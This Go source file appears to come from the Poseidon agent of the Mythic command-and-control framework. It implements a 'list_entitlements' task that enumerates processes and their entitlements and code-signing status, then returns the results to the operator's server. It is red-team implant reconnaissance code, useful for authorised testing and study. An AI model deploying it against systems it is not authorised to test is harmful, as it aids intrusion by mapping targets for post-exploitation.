package list_entitlements

import (
	// Standard
	"encoding/json"
	// Poseidon

	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ps"
)

type Arguments struct {
	PID int `json:"pid"`
}

type ProcessDetails struct {
	ProcessID    int                    `json:"process_id"`
	Entitlements map[string]interface{} `json:"entitlements"`
	Name         string                 `json:"name"`
	BinPath      string                 `json:"bin_path"`
	CodeSign     int                    `json:"code_sign"`
}

func Run(task structs.Task) {
	msg := task.NewResponse()
	var final string
	args := Arguments{}
	json.Unmarshal([]byte(task.Params), &args)
	if args.PID < 0 {
		procs, _ := ps.Processes()
		p := make([]ProcessDetails, len(procs))
		for index := 0; index < len(procs); index++ {
			p[index].ProcessID = procs[index].Pid()
			p[index].Name = procs[index].Name()
			p[index].BinPath = procs[index].BinPath()
			ent, _ := listEntitlements(p[index].ProcessID)
			if ent.Successful {
				err := json.Unmarshal([]byte(ent.Message), &p[index].Entitlements)
				if err != nil {
					p[index].Entitlements = map[string]interface{}{"error": err.Error()}
				}
			} else {
				p[index].Entitlements = map[string]interface{}{"error": "Unable to parse"}
			}
			cs, _ := listCodeSign(p[index].ProcessID)
			p[index].CodeSign = cs.CodeSign
		}
		temp, _ := json.Marshal(p)
		final = string(temp)
	} else {
		r, _ := listEntitlements(args.PID)
		if !r.Successful {
			msg.Status = "error"
		}
		final = r.Message
	}

	msg.Completed = true
	msg.UserOutput = final
	task.Job.SendResponses <- msg
	return
}
